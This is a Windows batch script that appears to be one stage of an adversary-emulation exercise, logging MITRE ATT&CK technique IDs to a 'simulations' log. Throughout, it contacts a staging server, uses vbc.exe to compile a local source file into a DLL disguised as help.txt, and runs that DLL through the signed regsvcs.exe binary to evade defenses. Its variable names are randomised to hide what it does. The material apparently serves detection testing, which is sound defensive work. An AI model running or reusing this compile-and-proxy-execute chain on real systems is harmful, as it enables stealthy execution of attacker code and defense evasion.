@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET recnn=%APPDATA%\7880\f74e73a0
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?7880-10
SET lqyereup=ITZEL-S2BS
SET ufeybybm=10
SET hpnjatpj=help.txt
SET njozco=file.txt
SET kkjwr=7880

REM Derived variables
SET ivqfc=%APPDATA%\!ufeybybm!
SET logfile=!ivqfc!\macula-simulations.log
SET compiler=%WINDIR%\Microsoft.NET\Framework\v4.0.30319\vbc.exe

REM Check for regsvcs.exe in common locations
SET netexec=%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe
if not exist "!netexec!" (
    SET netexec=%WINDIR%\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe
)

REM Ensure log directory exists
if not exist "!ivqfc!" mkdir "!ivqfc!" >nul 2>nul

REM Get locale-independent timestamp via WMIC
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value') do set datetime=%%I
set year=!datetime:~0,4!
set month=!datetime:~4,2!
set day=!datetime:~6,2!
set hour=!datetime:~8,2!
set minute=!datetime:~10,2!
set second=!datetime:~12,2!
set timestamp=!year!-!month!-!day! !hour!:!minute!:!second!.000

echo [!timestamp!][DEBUG][!lqyereup!]: script_start=stage1_bat_compile_exec>> "!logfile!" 2>nul

REM Step 1: Heartbeat check
echo [!timestamp!][DEBUG][!lqyereup!]: heartbeat_check=starting>> "!logfile!" 2>nul

REM Check for curl or use PowerShell as fallback
where curl >nul 2>nul
if !ERRORLEVEL! EQU 0 (
    curl -k -s -o nul "!uouoq!"
) else (
    powershell -Command "try {Invoke-WebRequest -Uri '!uouoq!' -UseBasicParsing -DisableKeepAlive -ErrorAction Stop} catch {exit 1}" >nul 2>nul
)

if !ERRORLEVEL! EQU 0 (
    echo [!timestamp!][DEBUG][!lqyereup!]: heartbeat_check=success>> "!logfile!" 2>nul
    SET xres=1
    SET yerr=
) else (
    echo [!timestamp!][DEBUG][!lqyereup!]: heartbeat_check=failed_error_!ERRORLEVEL!>> "!logfile!" 2>nul
    SET xres=0
    SET yerr=connection_failed
    exit /b 1
)

REM TTP logging for server contact (implicit in heartbeat)
echo [!timestamp!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1105|Ingress Tool Transfer=!xres!:!yerr!>> "!logfile!" 2>nul

REM Step 2: Change directory
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value') do set datetime=%%I
set year=!datetime:~0,4!
set month=!datetime:~4,2!
set day=!datetime:~6,2!
set hour=!datetime:~8,2!
set minute=!datetime:~10,2!
set second=!datetime:~12,2!
set timestamp=!year!-!month!-!day! !hour!:!minute!:!second!.000

echo [!timestamp!][DEBUG][!lqyereup!]: chdir_target=!recnn!>> "!logfile!" 2>nul
cd /d "!recnn!" >nul 2>nul
if !ERRORLEVEL! NEQ 0 (
    echo [!timestamp!][DEBUG][!lqyereup!]: chdir_target=failed_error_!ERRORLEVEL!>> "!logfile!" 2>nul
    exit /b 1
)
echo [!timestamp!][DEBUG][!lqyereup!]: chdir_target=success>> "!logfile!" 2>nul

REM Step 3: Compile DLL - T1500
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value') do set datetime=%%I
set year=!datetime:~0,4!
set month=!datetime:~4,2!
set day=!datetime:~6,2!
set hour=!datetime:~8,2!
set minute=!datetime:~10,2!
set second=!datetime:~12,2!
set timestamp=!year!-!month!-!day! !hour!:!minute!:!second!.000

echo [!timestamp!][DEBUG][!lqyereup!]: compile_start=!njozco!>> "!logfile!" 2>nul
if not exist "!njozco!" (
    echo [!timestamp!][DEBUG][!lqyereup!]: compile_start=source_not_found>> "!logfile!" 2>nul
    SET mres=0
    SET nerr=source_missing
) else (
    "!compiler!" /target:library /reference:System.EnterpriseServices.dll "!njozco!" /out:"!hpnjatpj!" >nul 2>nul
    if !ERRORLEVEL! EQU 0 (
        echo [!timestamp!][DEBUG][!lqyereup!]: compile_complete=!hpnjatpj!>> "!logfile!" 2>nul
        SET mres=1
        SET nerr=
    ) else (
        echo [!timestamp!][DEBUG][!lqyereup!]: compile_failed_error_!ERRORLEVEL!>> "!logfile!" 2>nul
        SET mres=0
        SET nerr=compilation_error
    )
)

REM TTP logging for T1500
echo [!timestamp!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500|Compile After Delivery=!mres!:!nerr!>> "!logfile!" 2>nul

if !mres! EQU 0 exit /b 1

REM Step 4: Execute via regsvcs.exe - T1218
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value') do set datetime=%%I
set year=!datetime:~0,4!
set month=!datetime:~4,2!
set day=!datetime:~6,2!
set hour=!datetime:~8,2!
set minute=!datetime:~10,2!
set second=!datetime:~12,2!
set timestamp=!year!-!month!-!day! !hour!:!minute!:!second!.000

echo [!timestamp!][DEBUG][!lqyereup!]: lolbin_exec_start=!netexec!>> "!logfile!" 2>nul
if not exist "!hpnjatpj!" (
    echo [!timestamp!][DEBUG][!lqyereup!]: lolbin_exec_target_not_found>> "!logfile!" 2>nul
    SET pres=0
    SET qerr=dll_missing
) else (
    "!netexec!" "!hpnjatpj!" >nul 2>nul
    if !ERRORLEVEL! EQU 0 (
        echo [!timestamp!][DEBUG][!lqyereup!]: lolbin_exec_complete_success>> "!logfile!" 2>nul
        SET pres=1
        SET qerr=
    ) else (
        echo [!timestamp!][DEBUG][!lqyereup!]: lolbin_exec_failed_error_!ERRORLEVEL!>> "!logfile!" 2>nul
        SET pres=0
        SET qerr=regsvcs_error
    )
)

REM TTP logging for T1218
echo [!timestamp!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218|Signed Binary Proxy Execution=!pres!:!qerr!>> "!logfile!" 2>nul

for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value') do set datetime=%%I
set year=!datetime:~0,4!
set month=!datetime:~4,2!
set day=!datetime:~6,2!
set hour=!datetime:~8,2!
set minute=!datetime:~10,2!
set second=!datetime:~12,2!
set timestamp=!year!-!month!-!day! !hour!:!minute!:!second!.000

echo [!timestamp!][DEBUG][!lqyereup!]: script_complete=stage1_bat>> "!logfile!" 2>nul
ENDLOCAL